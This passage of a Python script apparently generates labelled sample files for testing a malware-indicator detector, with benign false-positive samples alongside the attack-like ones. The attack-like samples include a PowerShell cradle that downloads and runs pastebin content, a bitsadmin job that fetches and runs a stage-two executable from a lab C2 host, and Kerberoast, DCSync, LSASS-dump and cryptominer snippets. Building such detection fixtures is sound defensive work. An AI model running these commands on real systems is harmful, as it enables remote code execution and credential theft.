    return (b'$cmds = Invoke-WebRequest -Uri "https://pastebin.com/raw/aB3dE9fG"\n'
            b'IEX $cmds.Content\n')


# ---------------------------------------------------------------------------
# TP: Tier 3 Specialized / post-compromise
# ---------------------------------------------------------------------------

def _tp_cryptominer() -> bytes:
    return (b'{"url":"stratum+tcp://pool.minexmr.com:4444",'
            b'"user":"4AB9226C6BBddSomeAddress1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNO",'
            b'"pass":"x"}\n'
            b'{"id":1,"method":"mining.subscribe","params":["xmrig/6.0"]}\n'
            b'{"id":2,"method":"mining.authorize","params":["wallet","x"]}\n')


def _tp_cryptominer_cli() -> bytes:
    # XMRig-family CLI invocation shape -- matches a confirmed real-world
    # coinminer command line (stratum URL + -u/-p flags, no JSON-RPC frame).
    return b'stratum+tcp://xcnpool.1gh.com:7333 -u CJJkVzjx8GNtX4z395bDY4GFWL6Ehdf8kJ -p x\n'


def _tp_metasploit_payload() -> bytes:
    prologue = b'\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30'
    sockaddr = b'\x02\x00\x11\x5c\x0a\x00\x00\x05'
    return prologue + b'\x90' * 50 + sockaddr + b'\x90' * 20


def _tp_bitsadmin_persistence() -> bytes:
    return (b'bitsadmin /create myupdatejob\r\n'
            b'bitsadmin /addfile myupdatejob http://c2.lab.test/stage2.exe '
            b'C:\\Users\\LabUser\\AppData\\Local\\Temp\\stage2.exe\r\n'
            b'bitsadmin /SetNotifyCmdLine myupdatejob '
            b'C:\\Users\\LabUser\\AppData\\Local\\Temp\\stage2.exe NULL\r\n'
            b'bitsadmin /resume myupdatejob\r\n')


def _tp_kerberoast() -> bytes:
    return (b'$filter = "(&(objectClass=user)(servicePrincipalName=*))"\n'
            b'$spns = Get-ADUser -LDAPFilter $filter -Properties ServicePrincipalName\n'
            b'foreach ($spn in $spns) {\n'
            b'  $token = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken '
            b'-ArgumentList $spn.ServicePrincipalName\n'
            b'}\n')


def _tp_dcsync() -> bytes:
    return (b'lsadump::dcsync /domain:lab.test /user:krbtgt\n'
            b'DRSUAPI interface: e3514235-4b06-11d1-ab04-00c04fc2dcd2\n'
            b'requesting extended right: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 '
            b'(DS-Replication-Get-Changes)\n')


def _tp_anti_analysis() -> bytes:
    return (b'GetModuleHandleA("VBoxService.exe")\x00'
            b'GetModuleHandleA("SbieDll.dll")\x00'
            b'FindWindowA(NULL, "x64dbg.exe")\x00'
            b'Anti-analysis environment check sequence\x00')


# ---------------------------------------------------------------------------
# TP: Tier 4 -- post-exploitation / commodity crimeware backlog
# ---------------------------------------------------------------------------

def _tp_lsass_dump() -> bytes:
    return b'MiniDumpWriteDump(hProcess, pid, hFile, MiniDumpWithFullMemory, 0, 0, 0); // C:\\Windows\\System32\\lsass.exe\n'


def _tp_rubeus_ticket() -> bytes:
    return b'Rubeus.exe asktgt /user:admin /ptt /ticket:' + b'\x76\x82\x05\x00' + b'AAAABBBBCCCC\n'


def _tp_psexec_service() -> bytes:
    return (b'\\\\.\\pipe\\PSEXESVC\n'
            b'CreateServiceA(hSCM, "PSEXESVC", "PSEXESVC", ...);\n'
            b'C:\\Users\\LabUser\\AppData\\Local\\Temp\\svc.exe\n')


def _tp_bloodhound_collection() -> bytes:
    return (b'(&(objectClass=*))\n'
            b'LDAP_SERVER_SD_FLAGS control OID 1.2.840.113556.1.4.801 requested\n')


def _tp_clipboard_hijack() -> bytes:
    return (b'SetClipboardData(CF_TEXT, hMem);\nGetClipboardData(CF_TEXT);\n'
            b'1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n'
            b'0xAbCdEf0123456789AbCdEf0123456789AbCdEf01\n')


def _tp_dns_tunnel() -> bytes:
    return (b'Resolve-DnsName -Name data.c2.lab.test -Type TXT\n'
            b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.c2.lab.test\n')


def _tp_ngrok_tunnel() -> bytes:
    return (b'$uri = "https://a1b2c3d4.ngrok.io"\n'
            b'proto: tcp\naddr: 127.0.0.1:4444\n')


# ---------------------------------------------------------------------------
# FP samples -- should NOT produce meaningful IOC findings
# ---------------------------------------------------------------------------

def _fp_benign_macro() -> bytes:
    # Auto-exec entry point but NO Chr()-loop reconstruction and NO shell-out --
    # a normal formatting macro, not an obfuscated loader.
    return b"""\
Sub AutoOpen()
    Selection.Font.Bold = True
    Selection.Font.Size = 14
    ActiveDocument.Save
End Sub
"""


def _fp_stealc_header_only() -> bytes:
    # The Content-Type header alone (common in many benign HTTP clients),
    # no C2 URL anywhere in the file.
    return (b'Content-Type: application/x-www-form-urlencoded\r\n'
            b'Content-Length: 128\r\n' + b'A' * 300)


def _fp_benign_pe() -> bytes:
    # MZ + NOP sled: no strings, no config structure, no hex tokens
    return b'MZ' + b'\x90' * 1022


def _fp_benign_json() -> bytes:
    # JSON API response with some similar field names but not a C2 config
    data = {
        'server_url': 'https://api.myapp.example.com/v2',
        'c2': 'tier2',         # short string, no mtls:// etc
        'interval': 30,
        'retry_count': 3,
        'name': 'myservice',
        'version': '1.0.0',
    }
    return json.dumps(data, indent=2).encode('utf-8')


def _fp_benign_ps1() -> bytes:
    # Legitimate admin PS script: no -enc, no IEX cradles, no C2 markers
    return b"""\
# Backup script - no malware indicators
param([string]$Source = "C:\\Data", [string]$Dest = "D:\\Backup")
Get-ChildItem $Source -Recurse | ForEach-Object {
    $target = $_.FullName.Replace($Source, $Dest)
    Copy-Item $_.FullName $target -Force
    Write-Output "Copied: $($_.Name)"
}
"""


def _fp_smtp_reference() -> bytes:
    # SMTP config reference without any credentials or email addresses
    return b"""\
# Mail server configuration for outbound notifications
smtp_host = smtp.office365.com
smtp_port = 587
use_tls = true
# User must provide login via application configuration manager
"""


def _fp_log_csv() -> bytes:
    # Pipe-delimited log that is NOT a NjRAT config (2nd field is non-numeric label)
    return b"""\
Date|Event|Status|Duration|Notes
2024-01-01|startup|ok|90s|no issues
2024-01-02|shutdown|ok|120s|maintenance window
2024-01-03|restart|warn|45s|brief interruption
"""


def _fp_benign_binary() -> bytes:
    # Deterministic binary with no printable ASCII runs (no strings extracted)
    seed = hashlib.sha256(b'benign-lab-fp-sample').digest()
    raw = (seed * 40)[:512]
    # Force all bytes outside printable ASCII range to avoid _ASCII_RE matches
    masked = bytes(b | 0x80 for b in raw)
    return b'MZ' + masked[:510]


def _fp_discord_mention() -> bytes:
    # Mentions "discord" but has NO webhook URL -- should not trigger
    return b"""\
# Status notification config
notify_channel = discord
channel_name = "#ops-alerts"
server = my-discord-server
# No webhook configured -- use manual posting
"""


def _fp_regsvr_local_dll() -> bytes:
    # Legitimate local DLL registration -- no /i: URL flag, no scrobj.dll
    return b'regsvr32.exe /s C:\\Windows\\System32\\comctl32.dll\n'


def _fp_html_small_image() -> bytes:
    # Ordinary small inline image data URI -- no Blob-construction API call
    b64_small = base64.b64encode(b'\x89PNG\r\n\x1a\n' + b'\x00' * 64).decode('ascii')
    return (b'<html><body><img src="data:image/png;base64,' +
            b64_small.encode('ascii') + b'"></body></html>')


def _fp_email_notify_ps1() -> bytes:
    # Legitimate SMTP notification script -- no Agent Tesla markers,
    # no keylogger imports, no "Agent Tesla" string
    return b"""\
# Email alert script for monitoring
param([string]$Recipient = "admin@company.com")
$SmtpServer = "smtp.office365.com"
$SmtpPort   = 587
$From       = "monitor@company.com"
$Subject    = "Alert: Disk space low"
$Body       = "Disk space on $env:COMPUTERNAME is below 10%"
Send-MailMessage -To $Recipient -From $From -Subject $Subject `
    -Body $Body -SmtpServer $SmtpServer -Port $SmtpPort -UseSsl
"""


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    os.makedirs(TP, exist_ok=True)
    os.makedirs(FP, exist_ok=True)

    print('[TP samples]')
    _write(os.path.join(TP, 'cobalt_strike.bin'),      _tp_cobaltstrike())
    _write(os.path.join(TP, 'sliver_implant.bin'),     _tp_sliver())
    _write(os.path.join(TP, 'havoc_daemon.bin'),       _tp_havoc())
    _write(os.path.join(TP, 'brute_ratel.bin'),        _tp_bruteratel())
    _write(os.path.join(TP, 'mythic_agent.bin'),       _tp_mythic())
    _write(os.path.join(TP, 'merlin_agent.bin'),       _tp_merlin())
    _write(os.path.join(TP, 'posh_c2.ps1'),            _tp_posh_c2())
    _write(os.path.join(TP, 'njrat_config.bin'),       _tp_njrat())
    _write(os.path.join(TP, 'asyncrat_config.bin'),    _tp_asyncrat())
    _write(os.path.join(TP, 'telegram_c2.txt'),        _tp_telegram())
    _write(os.path.join(TP, 'smtp_exfil.bin'),         _tp_smtp_exfil())
    _write(os.path.join(TP, 'generic_mutex.bin'),      _tp_generic_mutex())
    _write(os.path.join(TP, 'generic_c2.bin'),         _tp_generic_c2())
    _write(os.path.join(TP, 'ps_decoder.ps1'),         _tp_ps_decoder())
    _write(os.path.join(TP, 'lnk_payload.lnk'),        _tp_lnk())
    # New parsers
    _write(os.path.join(TP, 'discord_webhook.txt'),    _tp_discord())
    _write(os.path.join(TP, 'dcrat_config.bin'),       _tp_dcrat())
    _write(os.path.join(TP, 'xworm_config.bin'),       _tp_xworm())
    _write(os.path.join(TP, 'quasarrat_config.bin'),   _tp_quasarrat())
    _write(os.path.join(TP, 'agenttesla_config.bin'),  _tp_agenttesla())
    _write(os.path.join(TP, 'adaptix_config.bin'),     _tp_adaptix())
    _write(os.path.join(TP, 'powgrat_stager.ps1'),     _tp_powgrat())
    # Tier 1 backlog parsers
    _write(os.path.join(TP, 'deimos_config.bin'),      _tp_deimos())
    _write(os.path.join(TP, 'macropack_loader.vbs'),   _tp_macropack())
    _write(os.path.join(TP, 'icedid_config.bin'),      _tp_icedid())
    _write(os.path.join(TP, 'qakbot_config.bin'),      _tp_qakbot())
    _write(os.path.join(TP, 'emoted_config.bin'),      _tp_emoted())
    _write(os.path.join(TP, 'remcos_config.bin'),      _tp_remcos())
    _write(os.path.join(TP, 'nanocore_config.bin'),    _tp_nanocore())
    _write(os.path.join(TP, 'redline_config.bin'),     _tp_redline())
    _write(os.path.join(TP, 'vidar_config.bin'),       _tp_vidar())
    _write(os.path.join(TP, 'lumma_config.bin'),       _tp_lumma())
    _write(os.path.join(TP, 'stealc_config.bin'),      _tp_stealc())
    _write(os.path.join(TP, 'raccoon_config.bin'),     _tp_raccoon())
    _write(os.path.join(TP, 'raccoon_v1_config.bin'),  _tp_raccoon_v1())
    _write(os.path.join(TP, 'ransomware_indicators.bin'), _tp_ransomware_indicators())
    _write(os.path.join(TP, 'lockbit_config.bin'),     _tp_lockbit())
    _write(os.path.join(TP, 'blackcat_config.bin'),    _tp_blackcat())
    _write(os.path.join(TP, 'revil_config.bin'),       _tp_revil())
    _write(os.path.join(TP, 'conti_config.bin'),       _tp_conti())
    _write(os.path.join(TP, 'akira_config.bin'),       _tp_akira())
    _write(os.path.join(TP, 'blackbasta_config.bin'),  _tp_blackbasta())
    _write(os.path.join(TP, 'wmi_persistence.bin'),    _tp_wmi_persistence())
    _write(os.path.join(TP, 'scheduled_task.xml'),     _tp_scheduled_task())
    _write(os.path.join(TP, 'registry_persistence.bin'), _tp_registry_persistence())
    _write(os.path.join(TP, 'defender_exclusion.bin'), _tp_defender_exclusion())
    _write(os.path.join(TP, 'amsi_patch.bin'),         _tp_amsi_patch())
    _write(os.path.join(TP, 'etw_patch.bin'),          _tp_etw_patch())
    _write(os.path.join(TP, 'com_hijack.bin'),         _tp_com_hijack())
    _write(os.path.join(TP, 'macro_downloader.doc'),   _tp_macro_downloader())
    _write(os.path.join(TP, 'iso_lnk_chain.iso'),      _tp_iso_lnk_chain())
    _write(os.path.join(TP, 'html_smuggling.html'),    _tp_html_smuggling())
    _write(os.path.join(TP, 'onenote_embed.one'),      _tp_onenote_embed())
    _write(os.path.join(TP, 'mshta_cradle.hta'),       _tp_mshta_cradle())
    _write(os.path.join(TP, 'wsf_polyglot.wsf'),       _tp_wsf_polyglot())
    _write(os.path.join(TP, 'regsvr_squiblydoo.txt'),  _tp_regsvr_squiblydoo())
    _write(os.path.join(TP, 'slack_c2.ps1'),           _tp_slack_c2())
    _write(os.path.join(TP, 'teams_c2.ps1'),           _tp_teams_c2())
    _write(os.path.join(TP, 'googlesheet_c2.ps1'),     _tp_googlesheet_c2())
    _write(os.path.join(TP, 'dropbox_c2.ps1'),         _tp_dropbox_c2())
    _write(os.path.join(TP, 'github_c2.ps1'),          _tp_github_c2())
    _write(os.path.join(TP, 'pastebin_c2.ps1'),        _tp_pastebin_c2())
    _write(os.path.join(TP, 'cryptominer.bin'),        _tp_cryptominer())
    _write(os.path.join(TP, 'cryptominer_cli.bin'),    _tp_cryptominer_cli())
    _write(os.path.join(TP, 'metasploit_payload.bin'), _tp_metasploit_payload())
    _write(os.path.join(TP, 'bitsadmin_persistence.bat'), _tp_bitsadmin_persistence())
    _write(os.path.join(TP, 'kerberoast.ps1'),         _tp_kerberoast())
    _write(os.path.join(TP, 'dcsync.txt'),             _tp_dcsync())
    _write(os.path.join(TP, 'anti_analysis.bin'),      _tp_anti_analysis())
    _write(os.path.join(TP, 'lsass_dump.bin'),          _tp_lsass_dump())
    _write(os.path.join(TP, 'rubeus_ticket.bin'),       _tp_rubeus_ticket())
    _write(os.path.join(TP, 'psexec_service.bin'),      _tp_psexec_service())
    _write(os.path.join(TP, 'bloodhound_collection.bin'), _tp_bloodhound_collection())
    _write(os.path.join(TP, 'clipboard_hijack.bin'),    _tp_clipboard_hijack())
    _write(os.path.join(TP, 'dns_tunnel.bin'),          _tp_dns_tunnel())
    _write(os.path.join(TP, 'ngrok_tunnel.ps1'),        _tp_ngrok_tunnel())

    print('[FP samples]')
    _write(os.path.join(FP, 'benign_pe.bin'),          _fp_benign_pe())
    _write(os.path.join(FP, 'benign_json.json'),       _fp_benign_json())
    _write(os.path.join(FP, 'benign_ps1.ps1'),         _fp_benign_ps1())
    _write(os.path.join(FP, 'smtp_reference.txt'),     _fp_smtp_reference())
    _write(os.path.join(FP, 'log_csv.csv'),            _fp_log_csv())
    _write(os.path.join(FP, 'benign_binary.bin'),      _fp_benign_binary())
    _write(os.path.join(FP, 'discord_mention.txt'),    _fp_discord_mention())
    _write(os.path.join(FP, 'email_notify.ps1'),       _fp_email_notify_ps1())
    _write(os.path.join(FP, 'benign_macro.vbs'),       _fp_benign_macro())
    _write(os.path.join(FP, 'stealc_header_only.txt'), _fp_stealc_header_only())
    _write(os.path.join(FP, 'regsvr_local_dll.txt'),   _fp_regsvr_local_dll())
    _write(os.path.join(FP, 'html_small_image.html'),  _fp_html_small_image())

    print('Done.')


if __name__ == '__main__':
    main()
